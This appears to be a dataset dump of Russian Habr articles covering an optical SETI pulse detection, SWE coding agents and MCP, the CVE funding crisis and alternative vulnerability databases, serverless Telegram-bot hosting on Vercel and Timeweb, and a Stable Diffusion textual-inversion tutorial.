Доктор Стэнтон — ветеран Лаборатории реактивного движения НАСА (JPL), среди его заслуг — участие в полётах «Вояджера» и работа в качестве инженерного руководителя миссии Gravity Recovery And Climate Experiment (GRACE). После выхода на пенсию он посвятил себя поиску внеземного разума (SETI) с помощью 76,2-сантиметрового телескопа в обсерватории Шей-Медоу в Биг-Бир, Калифорния, и разработанного им многоканального фотометра. Статья с описанием результатов его исследования опубликована в журнале Acta Astronautica.
В течение многих лет Стэнтон использовал эти приборы для наблюдения за более чем 1300 солнцеподобными звёздами в поисках оптических сигналов SETI. В отличие от традиционных исследований SETI, в которых для поиска доказательств потенциальных внеземных передач используются радиоантенны, оптические SETI ищут импульсы света, которые могут быть результатом лазерной связи или массивов направленной энергии. Последний пример был рассмотрен в последние годы благодаря проекту Starshot, концепции НАСА «Направленная энергия для межзвёздных исследований» (DEEP-IN) и аналогичным концепциям межзвёздных миссий.
Как отметил Стэнтон, область оптического SETI берёт своё начало в исследовании 1961 года, проведённом Шварцем и Таунсом. Они пришли к выводу, что лучший способ, которым внеземной разум (ВЗР) может послать оптический сигнал, выделяющийся на фоне их звезды, — это интенсивные наносекундные лазерные импульсы. Другие оптические SETI-поисковики ищут сигналы в инфракрасном диапазоне, в спектрах высокого разрешения или в видимом свете. Как рассказал Стэнтон в интервью Universe Today по электронной почте, его SETI-поиск отличается от обычных оптических исследований:
""Мой подход заключается в том, что я смотрю на одну звезду в течение примерно 1 часа, используя подсчёт фотонов для получения образцов света звезды с очень высоким временным разрешением для астрономии (100 микросекундные образцы). В полученных временных рядах я затем ищу импульсы и оптические тона. В приборе используются легкодоступные готовые компоненты, которые можно интегрировать в персональный компьютер. Я не уверен, что кто-то ещё занимается подобным, учитывая значительные временные затраты. Мне не известно о каких-либо других открытиях подобных импульсов"".
После нескольких лет поисков Стэнтон заметил неожиданный «сигнал» 14 мая 2023 года во время наблюдения за HD 89389, звездой F-типа, которая немного ярче и массивнее нашего Солнца, расположенной в созвездии Большой Медведицы. Согласно статье Стэнтона, этот сигнал состоял из двух быстрых одинаковых импульсов с интервалом в 4,4 секунды, которые не были обнаружены в ходе предыдущих поисков. Затем он провёл сравнение с сигналами, производимыми самолётами, спутниками, метеорами, молниями, атмосферными сцинтилляциями, системными шумами и т.д.
Как он объяснил, несколько моментов в импульсах, обнаруженных вокруг HD 89389, делают их уникальными по сравнению со всем, что наблюдалось ранее:
А. Звезда становится ярче, а затем возвращается к своему обычному уровню, и всё это примерно за 0,2 с. Эти колебания слишком сильны, чтобы быть вызванными случайным шумом или атмосферной турбулентностью. Как можно заставить звезду размером более миллиона километров частично исчезнуть за десятую долю секунды? Источник этих колебаний не может находиться так же далеко, как сама звезда.
B. Во всех трёх событиях наблюдаются два практически идентичных импульса, разделённых интервалами от 1,2 до 4,4 секунды (третье событие, обнаруженное в наблюдении 18 января этого года, в статью не вошло). За более чем 1500 часов поисков не было обнаружено ни одного импульса, похожего на эти.
C. Тонкая структура в свете звезды между пиками первого импульса повторяется почти в точности во втором импульсе 4,4 с позже. Никто не знает, как объяснить такое поведение.
D. Не было обнаружено ничего движущегося рядом со звездой при одновременном фотографировании или в фоновом датчике, который легко обнаруживает далёкие спутники, движущиеся рядом с целевой звездой. Обычные сигналы от самолётов, спутников, метеоров, птиц и т. д. совершенно не похожи на эти импульсы.
Повторный анализ исторических данных в поисках подобных сигналов выявил ещё одну пару импульсов, обнаруженных вокруг HD 217014 (51 Пегаса) 30 сентября 2019 года. Эта звезда главной последовательности G-типа находится на расстоянии около 50,6 световых лет от Земли и по размеру, массе и возрасту схожа с нашим Солнцем. В 1995 году астрономы Обсерватории Верхнего Прованса обнаружили экзопланету, вращающуюся вокруг этой звезды, — горячий газовый гигант, который впоследствии получил название Димидиум. Это была одна из первых обнаруженных экзопланет, и впервые экзопланета была открыта вокруг звезды главной последовательности.
В то время, говорит Стэнтон, сигнал был принят за ложное срабатывание, вызванное птицами. Однако детальный анализ исключил такую возможность для всех наблюдаемых импульсов. Среди других возможностей, которые рассматривает Стэнтон, — преломление, вызванное атмосферой Земли, возможно, из-за ударной волны. Однако это маловероятно, поскольку ударные волны должны были бы произойти в идеальное время, чтобы совпасть со всеми тремя оптическими импульсами. Другие возможности включают дифракцию звёздного света на удалённом теле в Солнечной системе, частичные затмения, вызванные спутниками Земли или удалёнными астероидами, и «краевую дифракцию» на прямой кромке (т.н. «эффект Зоммерфельда»).
Существует также вероятность того, что эти импульсы могла породить гравитационная волна, что требует дополнительного рассмотрения. Ещё одна интересная возможность заключается в том, что это может быть результатом действия внеземных цивилизаций. Как указал Стэнтон, что бы ни модулировало свет этих звёзд, оно должно находиться относительно близко к Земле, а значит, любая активность инопланетян должна была идти в пределах нашей Солнечной системы. Более того, подобные импульсы наблюдались и у другой солнцеподобной звезды, расположенной в 81 световом году от Земли (HD 12051, 18 января 2025 года). Стэнтон подчёркивает, что необходимо больше данных, чтобы объяснить все три случая (и последующие открытия).
«Ни одно из этих объяснений на данный момент не является по-настоящему удовлетворительным», — сказал он. ""Мы не знаем, что за объект может породить эти импульсы и как далеко он находится. Мы не знаем, порождается ли двухимпульсный сигнал чем-то, проходящим между нами и звездой, или же он генерируется чем-то, что модулирует свет звезды, не перемещаясь по полю [зрения]. Пока мы не узнаем больше, мы даже не можем сказать, причастны ли к этому инопланетяне!""
Существуют проекты оптического SETI (OSETI) или LaserSETI, включая совместную работу, начатую Breakthrough Listen и Very Energetic Radiation Imaging Telescope Array System (VERITAS) Collaboration. Однако метод Стэнтона открывает широкие возможности для будущих исследований SETI, в ходе которых можно будет искать подобные примеры оптических импульсов. Для этого он предлагает два подхода, которые могут раскрыть больше информации об этом явлении и помочь астрономам установить более жёсткие ограничения на возможные причины его возникновения:
""Ищите события с помощью массивов синхронизированных оптических телескопов. Если объект движется между звездой и нами, этот подход должен сказать нам, с какой скоростью он движется по нормали к линии визирования, и, возможно, его размер и расстояние. [Кроме того,] было бы очень интересно, если бы свет звезды модулировался без объекта, движущегося через поле зрения"".
""Наблюдение за событиями с помощью телескопов, разделённых несколькими сотнями километров, может показать, что любое различие во времени прихода каждого импульса связано только с различием во времени прохождения света от звезды до каждого телескопа. Тогда, если мы не сможем объяснить эту вариацию света особенностями самой звезды, нам придётся объяснять ещё больше!"""
SWE-Agent: как AI-ассистенты меняют правила игры в разработке,https://habr.com/ru/articles/910290/,"Искусственный интеллект в программировании уже давно вышел за рамки простых подсказок кода. Современные инструменты, такие как GitHub Copilot, интегрированные в Visual Studio Code, способны не только ...","Искусственный интеллект в программировании уже давно вышел за рамки простых подсказок кода. Современные инструменты, такие как GitHub Copilot, интегрированные в Visual Studio Code, способны не только дописывать код, но и выполнять команды в терминале, запускать сборки и тесты прямо из редактора. Вот еще Open AI вчера выпустил Codex, это адаптация моего поста про SWE-Agent.
Однако, когда дело доходит до сложных изменений или отладки, эффективность агентов снижается. Например, при работе с запутанными зависимостями в CMake часто приходится вручную предоставлять необходимые файлы или устранять ошибки сборки.
В таких случаях полезно начать с добавления нового теста и валидировать каждый шаг агента.
CodeMonkeys подход к организации workflow
Последовательная разработка с участием человека (Human-in-the-loop)
Современные агенты программной инженерии (SWE-агенты) используют подход, напоминающий традиционные рабочие процессы:
Определение микроцели: например, “рефакторинг AuthService для поддержки JWT”.
Модульность: фокус на соответствующих модулях или файлах.
Внесение изменений: модификация кода для достижения цели.
Запуск тестов: выполнение юнит- и интеграционных тестов для проверки изменений.
Анализ результатов: определение следующих шагов на основе результатов тестирования — продолжение, пересмотр или обращение за помощью к человеку.
Этот итеративный процесс соответствует исследованиям в области масштабирования вычислений по времени (Test-Time Scaling): модели улучшают свои рассуждения, оценивая результаты и корректируя подход. Подобный подход реализован в современных reasoning-моделях, таких как OpenAI o1 и o3, а также в DeepSeek R1, которые демонстрируют улучшенные способности к рассуждению благодаря более длительным вычислениям во время инференса. 
Интеграция внешних инструментов с помощью Model Context Protocol (MCP)
Model Context Protocol (MCP) — это открытый стандарт, предназначенный для обеспечения бесшовной связи между AI-моделями и внешними инструментами или источниками данных.
Принципы архитектуры MCP:
Host: координирует работу нескольких клиентов и обеспечивает безопасность.
Client: поддерживает соединения с серверами, управляя протоколами связи и состоянием.
Server: предоставляет контекст, инструменты и подсказки клиентам, действуя как шлюз к конкретным источникам данных.
Преимущества интеграции MCP:
Расширенное понимание контекста: агенты получают более полное представление о проекте, получая доступ к внешним данным.
Улучшенная автоматизация рабочих процессов: агенты могут выполнять задачи, такие как обновление задач в Jira, получение документации из Confluence и мониторинг CI/CD-пайплайнов.
Масштабируемость: модульный дизайн позволяет легко интегрировать дополнительные инструменты и сервисы по мере развития проекта.
Контекст проектов и пользовательские инструкций
Для эффективной работы SWE-агенты требуют четкого понимания контекста проекта. Это начинается с процесса инициализации агента, в ходе которого он получает доступ к рабочему пространству проекта и более широкой кодовой базе, обычно в Git-репозитории.
Во время инициализации агент изучает ключевую документацию — такую как README, архитектурные диаграммы и руководства по стилю — формируя представление о структуре проекта. Он индексирует файлы и каталоги проекта, определяет инструменты сборки и готовится к запуску тестов и сборок через командную строку.
Эта начальная настройка критически важна, предоставляя агенту полное понимание зависимостей и соглашений проекта. Кроме того, эффективная инициализация включает в себя установление ассоциаций между техническим языком — такими как требования, пользовательские истории и архитектурные описания — и фактической кодовой базой.
Подход различается в зависимости от характера проекта: 
Существующие проекты: агент сосредотачивается на сборе контекста о текущем состоянии, используя документацию и структуру кодовой базы для понимания существующих функций и зависимостей.
Новые проекты: агент участвует в первоначальном сборе требований и проектировании системы, создавая основу для руководства процессом разработки с нуля.
Ключевым элементом этого рабочего процесса является использование пользовательских инструкций рабочего пространства. В Visual Studio Code их можно предоставить Copilot через файл .github/copilot-instructions.md в репозитории. Этот файл позволяет разработчикам определять специфические для проекта контракты и стандарты кодирования, настройки окружения.
GitHub Copilot в Visual Studio Code затем автоматически применяет эти инструкции, обеспечивая соответствие предложений кода практикам команды.
Принципы проектирования программного обеспечения и тестирования
SWE-агенты работают наиболее эффективно c кодовыми базами, которые хорошо структурированы и тщательно протестированы. Применение устоявшихся принципов проектирования программного обеспечения — таких как SOLID, модульность, чистая архитектура и CQRS — создает благоприятные условия для агента, делая код легко поддерживаемым и изменяемым.
Тестирование так же критично. Всеобьемлющий набор тестов не только позволяет узнавать о проблемах в коде на этапе запуска тестов, но и предоставляет агентам ориентиры во время разработки. Хорошо составленные тесты определяют структуру для отладки, позволяя агентам понимать ожидаемое поведение.
Эти принципы напрямую влияют на то, как SWE-агенты внедряются в проект. Во время инициализации агент собирает ключевую документацию, стандарты написания кода и архитектурные документы, включая руководства по стилю, предпочтительные шаблоны проектирования, границы модулей, структуру и подходы к тестированию.
Предоставляя четкие принципы проектирования и надежные практики тестирования с самого начала, AI-агенты могут создавать и модифицировать, пока под контролем человека, программное обеспечение.
Заключение
Хотя SWE-агенты представляют собой значительный шаг вперед, решение высоко сложных задач программной инженерии остается вызовом. Такие проблемы, как запутанные зависимости, неоднозначные требования или ошибки интеграции, по-прежнему трудны даже для самых продвинутых агентов.
Однако новые исследования и практические рабочие процессы предлагают перспективные решения:
Масштабирование вычислений во время тестирования: предоставляя агентам больше вычислительных ресурсов и времени в ключевые моменты, они могут оценивать несколько стратегий, учиться на результатах и итеративно двигаться к лучшим решениям.
Последовательная разработка, ориентированная на микроцели: разбивая большие проблемы на небольшие, тестируемые шаги — каждый из которых проверяется перед продолжением — как агенты, так и люди могут эффективно управлять сложностью.
CI/CD-пайплайны остаются важным компонентом. Они ответственны за выполнение тестов, выявления ошибок. Интеграция агентов с этими системами не только ускоряет рабочие процессы, но и устанавливает цикл обратной связи, который помогает агентам эффективнее помогать инженерам.
Обогащая контекст проекта, поддерживая комплексную документацию и принимая последовательные, ориентированные на тестирование рабочие процессы, команды могут наделить агентов способностью справляться даже со сложными изменениями с возрастающей эффективностью.
Ссылки:
SWE-agent: Agent-Computer Interfaces Enable Automated Software Engineering — arxiv.org/pdf/2405.15793
CodeMonkeys: Scaling Test-Time Compute for Software Engineering — arxiv.org/pdf/2501.14723
Thinking Longer, Not Larger: Enhancing Software Engineering Agents via Scaling Test-Time Compute — arxiv.org/pdf/2503.23803
Introducing the Model Context Protocol — Anthropic — anthropic.com/news/model-context-protocol"
Деньги и автономия — ситуация в сфере баз данных уязвимостей,https://habr.com/ru/companies/vasexperts/articles/910240/,"Недавно в США задумались о сокращении финансирования CVE (глобальной базы данных об уязвимостях). Решение даже приняли, но очень быстро пересмотрели. Подобной неопределенности хватило, чтобы в мире за...","Недавно в США задумались о сокращении финансирования CVE (глобальной базы данных об уязвимостях). Решение даже приняли, но очень быстро пересмотрели. Подобной неопределенности хватило, чтобы в мире заговорили об альтернативах. В материале — обсуждаем ситуацию вокруг CVE, европейские и российские инициативы.
Фотография: Bùi Hoàng Long / Unsplash
Ситуация с CVE
База данных Common Vulnerabilities and Exposures (CVE) представляет собой глобальную систему классификации уязвимостей. В наполнении базы CVE участвуют 453 организации из 40 стран, в том числе из России. Так, в прошлом году в неё были добавлены 40 тыс. уязвимостей — это на 38% больше, чем годом ранее. По данным организации VulnCheck — она уполномочена присваивать уязвимостям уникальные идентификаторы — в среднем каждую неделю появляются десятки критических уязвимостей. В целом CVE — это крупнейшая база, которой пользуются разработчики и специалисты во всем мире.
За финансирование программы по наполнению и поддержке базы CVE отвечает агентство CISA. Журналисты издания The Register говорят, что за последние два года на базу выделяли около 30 млн долларов. Но месяц назад правительство США решило оптимизировать расходы бюджета, в том числе на CVE. И пускай решение оперативно пересмотрели, одобрив бюджет на 11 месяцев, ситуация стала шоком для проекта. Эксперт по кибербезопасности и основатель Luta Security Кэти Муссурис сказала, что прекратить поддержку CVE — это «все равно, что лишить ИБ-отрасль кислорода и ожидать, что та резко отрастит жабры». Зависимость проекта от одного крупного спонсора сделала его уязвимым, и в ИТ-сообществе заговорили о поиске альтернатив.
Стоит заметить, что в марте прошлого года NVD (Национальная база уязвимостей США) приостановила обработку и анализ данных об уязвимостях в программном обеспечении и сервисах. Она перестала предоставлять CVE метаданные, включая оценку степени опасности уязвимостей. ИБ-специалисты заговорили о кризисе, а в СМИ стали появляться заголовки в духе: «Хакеры ликуют».
Критике подвергли и совет директоров CVE, который не предупредил комьюнити о риске обрыва финансирования (предположительно, такая информация у него была). Иронично, что незадолго до инцидента прошла тематическая конференция VulnCon, где участники с оптимизмом обсуждали будущее базы уязвимостей.
Шаги к диверсификации
Совет директоров и руководство CVE объявили о создании CVE Foundation — отдельной некоммерческой организации, которая станет финансировать развитие проекта. Ожидается, что фонд будет привлекать средства от частных компаний, международных партнеров и через краудфандинг. Готовность взять на себя инициативу в случае кризиса также выказали отдельные CNA (CVE Numbering Authority). Так, после объявления о прекращении финансирования в VulnCheck зарезервировали тысячу CVE-кодов, чтобы продолжить работу с базой.
Что касается европейских CNA, они также развивают собственные проекты — например, базу данных EUVD (European Vulnerability Database). Идея зародилась в 2024 году, однако ситуация с CVE подтолкнула Европейское агентство по сетевой и информационной безопасности (ENISA) ускорить разработку европейского решения.
Еще один проект достойный внимания — GCVE (Global Common Vulnerability Enumeration). Это — амбициозная инициатива из Люксембурга, которая предлагает децентрализованный подход к учету уязвимостей. В отличие от CVE, GCVE дает свободу действий независимым организациям, которые называются GCVE Numbering Authorities (GNAs). GNAs не зависят от центрального органа, не запрашивают у него блоки кодов и не обязаны строго следовать правилам по формату идентификаторов и процедурам их присвоения. Проект еще в разработке, но его авторы уже выпустили черновик документа, который объясняет, как проверить целостность файла каталога GCVE.
Разумеется, обе инициативы пока не могут соперничать с CVE по охвату и влиянию. Тем не менее их появление отражает глобальный тренд: страны стремятся к автономии в сфере кибербезопасности, не полагаясь на единую систему.
Что дальше
У нас развивают и собственный Банк данных уязвимостей (БДУ), созданный ФСТЭК. Особенность БДУ — ориентация на локальные стандарты: база включает данные об отечественных ОС (например, Astra Linux), информация о которых редко встречается в CVE. Хотя банк может интегрироваться с международными системами, чтобы следить за уязвимостями в иностранном ПО, которое используется в России. Кроме того, у отечественной базы есть потенциал в работе со странами БРИКС.
Еще один проект был предложен Роскомнадзором в 2023 году. Речь идет о национальной системе для автоматического выявления уязвимостей отечественных ресурсов. Платформа должна будет сканировать сайты, системы баз данных, почтовые серверы на наличие уязвимостей, чтобы повысить защиту от кибератак.
Фотография: Joshua Koblin / Unsplash
Кризис CVE в 2025 году показал, что даже ключевые инструменты кибербезопасности, на которые опираются сотни международных организаций, не застрахованы от проблем. Запуск CVE Foundation обещает сделать базу устойчивой к проблемам с финансированием, но ее успех зависит от поддержки сообщества и бизнеса. Европа развивает проекты EUVD и GCVE для защиты цифровой инфраструктуры и борьбы с киберугрозами, а Россия — развивает БДУ. Каждая из этих инициатив — шаг на пути к диверсифицированной экосистеме с автономными игроками.
Дополнительное чтение
В Европе снова заговорили об отказе от американских платформ и суверенном облаке — анализ ситуации. Несмотря на запрет передачи данных за пределы ЕС (кроме исключительных случаев), который действует с 1995 года, подавляющее большинство данных европейских компаний и правительственных организаций хранится на серверах в США. Сегодня европейские политики все чаще говорят о необходимости снизить зависимость от американских облачных провайдеров. Доходит до того, что некоторые называют хранение данных в AWS, Google Cloud и Azure угрозой национальной безопасности и призывают ужесточить регулирование. 
Рабочая сила и производства — телекомы, автопроизводители и корпорации из других областей все еще идут в Индию. Индия укрепляет статус мирового центра ИТ-аутсорсинга. 60% крупнейших компаний, включая American Airlines и IBM, передают туда до 30% ИТ-операций. Причина в низких зарплатах, но достаточно высокой квалификации индийских специалистов. Google и Amazon возводят кампусы в Хайдарабаде, а TP-Link планирует производить сетевые и IoT-устройства.
Предупрежден — значит вооружен: подборка открытых ресурсов с информацией о выявленных уязвимостях. В 2025 году открытые ресурсы, такие как CVE, NVD, OpenCVE и VulDB, помогают ИБ-специалистам отслеживать уязвимости. CVE стандартизирует идентификаторы, но не дает рекомендаций. NVD дополняет CVE патчами и оценкой критичности (CVSS), OpenCVE оповещает о новых угрозах, а VulDB анализирует даркнет и соцсети. Эти платформы, предлагающие API для автоматизации, остаются ключевым инструментом в борьбе с киберугрозами.
Перспективы 6G и системный подход к мобильным сетям — что почитать. Делимся открытыми источниками по теме: руководствами, аналитикой и исследованиями. Например, одна публикация рассказывает о перспективах и потенциале цифровых двойников в настройке мобильных сетей, другая посвящена принципам работы сетевого оборудования. Также есть учебник по ключевым принципам wireless-связи, который поможет составить целостное представление о теме. "
Опыт работы с Serverless-архитектурой для Telegram-бота на Vercel и Timeweb Cloud,https://habr.com/ru/articles/910278/,"В последнее время активно занимаюсь разработкой Telegram-бота с использованием Serverless-подхода.
Вводные
Почему Serverless?
Экономика.
Vercel: даёт возможность запустить apps бесплатно, и прицепом п...","В последнее время активно занимаюсь разработкой Telegram-бота с использованием Serverless-подхода.
Вводные
Почему Serverless?
Экономика.
Vercel: даёт возможность запустить apps бесплатно, и прицепом подключить blob хранилище и бд. Конечно, с ограничениями, которые на этапе MVP проекта кажутся недосигяемыми.
Цена: Бесплатно

@Timeweb_Cloud существенно низкие цены, в сравнении с vds от них же.
Цена Apps: 0.34р/час+
Цена VSD: 0.68р/час+
НО мы не сраниваем VDS, это для наглядности.
Возможностью сосредоточиться на коде.
И там и там, я просто подключаю репу, и пушаю код. Я не задумываюсь о серверах, сертификатах, докерах и всем таком остальном. А это существенная строка времязатрат.
Почему Vercel и TW?
Vercel - это мой начальный выбор, благодаря бесплатной цене.
Timeweb - знаком с платформой с давних лет.
Функционал и стек:
Бот выступает в роли AI-ассистента с интеграцией OpenAI.
Поэтому должен работать на серверах, которые не попадут под ограничения со стороны openAI из-за санкций.
Технологический стек: NestJS, облачная БД Neon (Vercel), blob-хранилище (Vercel)
История Timeweb
Vercel меня устраивал всем, за исключением недостатка возможности работы без vpn с сервисом. И честным serverless требованием к архитектуре приложения, которое по началу я воспринимал, как ошибку инфры Vercel.
Переезд с V на TW
С увеличением кодовой базы проекта, я стал наблюдать, что код просто переставал работать. В логах ошибок нет. Вебхук отрабатывал успешно. Причем такое поведение было рандомно. То работало, то не работало. Паралельно я общался с community Vercel, т.к. халявщикам поддержка не выделена, но community мне не помогло. И я решил переехать к TW, переезд занял мин 15, все взлетело, и я был доволен...пока...
Мои проблемы в TW
В один из дней, мои пользователи бота начинают массово жаловаться, что бот не работает. Я замечаю, что в консоли TW. ЦП забит под 100% уже несколько часов.
Раздел логов и деплоя приложения в TW тоже не открывается (бесконечный экран полинга). Кнопка рестартов недоступны, и я пытаюсь:
1) Сделать коммит, чтобы TW получив новый коммит, передеплоил приложуху: CPU - 100%, логи недоступны.
2) Я пытаюсь выбрать любой другой предыдущий успешный коммит: CPU - 100%, логи недоступны.
3) Пишу тикет в пятницу в 18 часов 10326999 в котором мне сказали, что передеплоили приложуху: CPU - 100%, логи недоступны.
4) Пишу, что не помогло. Прежде чем изучить ответ, напоминаю ( Цена Apps: 0.34р/час+ )
Ответ:
Сегодня уже не сможем дать ответ, т.к. требуется консультация с инженерами, а они работают в будние дни с 9 до 18. Также не удаляйте само приложение или попробуйте сделать повторный делой уже в понедельник.  Пожалуйста, ожидайте.
Время приключений TW
Я точно знаю, что дело не в коде. Кнопки включить/выключить нет. И я удаляю apps и создаю новый, сервис взлетел. Вижу новый УРЛ сервиса, заливаю его в конфиг, заливаю в репу: CPU - 100%, логи недоступны.
Правило 1: В успешном apps лучше не заливать новый коммит.
Удаляю apps, создаю новый. Зависает на деплое, в логах ошибка по ключу id_rsa.. что-то там.
Удаляю, создаю новый. Заливаю новый конфиг, повторный деплой взлетел. Бот не работает, открываю логи, openAI откидывает меня по 403 по региону. В новом тикете дают гипотезу:
Правило 2: Выбранный регион НЕ РФ, не гарантирует что ваш ip не в ЧС openAI/Bitbucket
Понимаю, что делать коммиты - опасно. Уточняю в тикете, как побороть проблему с новым урлом при создании apps. Как его узнать заранее, чтобы деплоить с 1го коммита нужный урл? Предложили так:
Настроить DNS - записи для технического домена - нельзя. Для привязки технического домена следует удалить домен ""tmdev-fitness.tw1.su"" и добавить заново в панель управления.
Костыль, но лучше, чем неработающее приложение. Создаю бесплатный домен в TW, привязываю его к apps. Apps не взлетает, удаляю его. Удаляю домен. Раза с 3го деплоится успешно apps, создаю домен, который уже в репе. Бот не работает...
Со стороны telegram ошибка: Webhook-info: Connection time out
Правило 3: После удаления бесплатного домена, созданный аналогичный домен, может не работать.
История Vercel
В паралель с формированием правил работы с apps в TW, я пытался поднять ту же кодовую базу в Vercel. К деплоям никаких вопросов, но код так же рандомно то работал, то нет. Логи ничего не давали, community не в силах мне помочь. Пришлось дебажить каждую строку, чтобы понять в чем проблема.
Проблема
Вернемся к началу статьи: ""...честным serverless требованием к архитектуре приложения, которое по началу я воспринимал, как ошибку инфры Vercel...""
Моя архитектура не подруземывала ""холодный запуск"" - это концепция подхода serverless. Именно поэтому у него такие низкие цены, в сравнении с VDS. Ваш процесс спит ( idle timeout ), пока его не разбудят, в то время как в VDS, он постоянно в памяти.
Idle Timeout
Vercel: После деплоя, мой процесс был в памяти, и бот работал. Через n минут (около 2мин), он уходил в спячку. Telegram делал webhook, будил процесс, и терялся где-то между слоями приложения, поскольку бот не успевал полностью инициализироваться, прежде чем ему нужно обработать команду. Вылечил, просто добавив проверку статуса инициализации бота перед обработкой команд.Это объясняет, почему бот рандомно то работает, то нет.
И это объясняет, почему не выполняются процессы по расписанию ( потому что процесс может спать, когда нужно выполнить что-то по расписанию )
Timeweb: Таких проблем, как в vercel, не было. Кроме того, там работают шедулеры (процессы по расписанию), поэтому я сделал вывод, что в Vercel - честный serverless. В Timeweb - нет.
Выводы
А какой у меня выбор?) Я учел все эти недостатки в коде, и теперь организационно я делаю следующие шаги:
Если TW apps уходит в проблему, просто меняю вебхук до vercel ~ 1 мин
Теперь бот работает, но не работают шедулеры.
Запускаю сразу по 3-4 apps в TW
В успешных apps проверяю доступность до bitbucket/openai
Перевожу вебхук на TW, итого ~ 10 мин
Т.е. TW по прежнему основной мой apps, а Vercel, как запасной план.
Надеюсь, мой опыт сохранит вам много нервов и кофеина.
Только зарегистрированные пользователи могут участвовать в опросе. Войдите, пожалуйста.
Испытывали ли вы сложности при развертывании Telegram-бота в serverless-среде?
10%
Да, испытывал сложности
1
20%
Нет, все взлетело сразу
2
70%
Мои боты живут на vds/vps/хостингах
7
0%
Свой вариант
0
Проголосовали 10 пользователей. Воздержался 1 пользователь."
Stable Diffusion WebUI Forge: Шаг 10. Текстовая инверсия,https://habr.com/ru/articles/910268/,"Текстовая инверсия (Textual Inversion) – это метод, который позволяет добавлять новые объекты или стили к имеющейся у нас модели. Файлы текстовой инверсии с объектами обычно имеют небольшой размер с р...","Текстовая инверсия (Textual Inversion) – это метод, который позволяет добавлять новые объекты или стили к имеющейся у нас модели. Файлы текстовой инверсии с объектами обычно имеют небольшой размер с расширением .pt или .safetensors. По сути, эти файлы являются дополнительными модулями для Stable Diffusion WebUI Forge и используемой нами модели FLUX.1 (например, flux1-dev-bnb-nf4-v2.safetensors), которые отображаются на закладке Txt2img / Textual Inversion.
Другими словами, текстовая инверсия очень быстро и без особых усилий может нам помочь персонализировать создаваемое изображение.
Например, представьте себе, что вам нужно создать изображение с Герольдом – главным героем игры «Ведьмак 3». Но не просто изображение, а чтобы его лицо было похоже на известного киноактера Генри Кавилла.
Что же нам нужно для этого сделать?
Первое, конечно, нужно скачать файлы с сайта civitai.com.
Переходим на сайт. Выбираем раздел модели (Models), затем фильтры (Filters).
И вот какой «сюрприз» нас ожидает…
На сайте нет необходимых нам файлов, совместимых с моделью FLUX.1.
Но! Расстраиваться не нужно.
Все дело в том, что, когда вы купите эту книгу, скорее всего, нужные файлы будут присутствовать на сайте. Поэтом я покажу вам, что делать дальше на примере, но с моделью Stable Diffusion 1.5. А также вы увидите существенную разницу в качестве работы двух моделей.
Для этого на сайте civitai.com мы в фильтре указываем не FLUX.1 D, а SD 1.5 или сразу находим страницу «Henry Cavill Textual Inversion Ultimate 15k» и файл текстовой инверсии. Ссылка для скачивания файла.
Обратите внимание на то, что на странице разработчик указывает, какие конкретно ключевые фразы (или триггеры) позволят активировать этот файл. В данном случае это два слова: «hnrycvllti» и «Henry Cavill».
После того как вы скачали файлы (не забудьте скачать пример картинки со страницы, которую нужно будет переименовать в соответствии с именем файла текстовой инверсии), их необходимо скопировать в папку «embeddings», которая у меня находится по следующему пути: D:\Stable Diffusion WebUI Forge\webui\embeddings.
Для того чтобы понять, как все это работает, давайте сначала создадим изображение с «обычным» ведьмаком:
Пишем «правильный» запрос: «medieval knight in metal armor, man with handsome face, blue eyes, gray long hair».
Выберем модель FLUX, с которой будем работать (flux1-schnell-bnb-nf4-v2.safetensors).
Sampling method: [Forge] Flux Realistic.
Устанавливаем минимальное разрешение изображения. Например, 512 × 512 (Width: 512; Height: 512);
FreeU Integrated (SD 1.x, SD 2.x, SDXL): ставим галочку и оставляем параметры по умолчанию.
PerturbedAttentionGuidance Integrated: ставим галочку и оставляем параметры по умолчанию.
Генерируем изображение.
Получился вот такой ведьмак:
Теперь нам нужно, чтобы у нас вышел ведьмак с лицом киноактера Генри Кавилла. Для этого нам нужно в нашем запросе добавить ключевые слова, которые нам позволят указать Stable Diffusion WebUI Forge и другой модели Stable Diffusion 1.5, что мы хотим воспользоваться соответствующим файлом из закладки Txt2img / Textual Inversion.
Модель Stable Diffusion 1.5 можно скачать по следующей ссылке: https://huggingface.co/pt-sk/stable-diffusion-1.5/blob/main/v1-5-pruned.safetensors.
Для этого в наш запрос вписываем ключевые слова, которые указал на сайте разработчик: «hnrycvllti, medieval knight in metal armor, Henry Cavill with handsome face, blue eyes, gray long hair», а также:
·         Выберем модель, с которой будем работать – Stable Diffusion 1.5.
·         Sampling method: Euler.
·         Устанавливаем минимальное разрешение изображения. Например, 512 × 512 (Width: 512; Height: 512).
·         FreeU Integrated (SD 1.x, SD 2.x, SDXL): ставим галочку и оставляем параметры по умолчанию.
·         PerturbedAttentionGuidance Integrated): ставим галочку и оставляем параметры по умолчанию.
·         Генерируем изображение.
Получается вот такой ведьмак:
Да, мягко говоря, модель Stable Diffusion 1.5 очень слабая и, конечно, устаревшая. Но в данном случае это не важно. Важно другое: она позволила нам увидеть , что такое «текстовая инверсия» в действии.
Какие выводы можно сделать из этого урока:
1.      Модель FLUX новая, и для нее сделано не так много вспомогательных моделей, которые бы существенно расширили ее функциональные возможности. Но это не страшно, так как FLUX и без расширений великолепно справляется со своими задачами.
2.      Stable Diffusion WebUI Forge – это отличная программа, в которую уже заложена возможность применения текстовой инверсии. Со временем расширений для программы будет очень много.
3.      Данный урок вам будет полезен хотя бы потому, что вы теперь знаете, как пользоваться текстовой инверсией.
4.      По моему мнению, текстовая инверсия меньше нагружает оборудование и работает очень быстро, но польза от нее сомнительная. Лучше воспользоваться LoRA. Например, для персонажа ведьмака Герольда она есть. Скачать файл модели можно по следующей ссылке: https://civitai.com/models/685562/henry-cavill-as-geralt-of-rivia-the-witcher (не забывайте про ключевые слова на странице разработчика). 
Я установил эту модель и поправил старый запрос (добавил вызов модели LoRa и ключевые слова): «<lora:Henry_Cavill_g3ral7:1>, medieval knight in metal armor, man with handsome face, blue eyes, gray long hair, g3ral7, leather armor, heavy leather armor, silver wolf pendant», а также:
Выберем модель FLUX, с которой будем работать (flux1-schnell-bnb-nf4-v2.safetensors).
Sampling method: [Forge] Flux Realistic.
Устанавливаем минимальное разрешение изображения. Например, 512 × 512 (Width: 512; Height: 512).
FreeU Integrated (SD 1.x, SD 2.x, SDXL): ставим галочку и оставляем параметры по умолчанию.
PerturbedAttentionGuidance Integrated): ставим галочку и оставляем параметры по умолчанию.
Генерируем изображение.
Получился вот такой замечательный ведьмак:
***
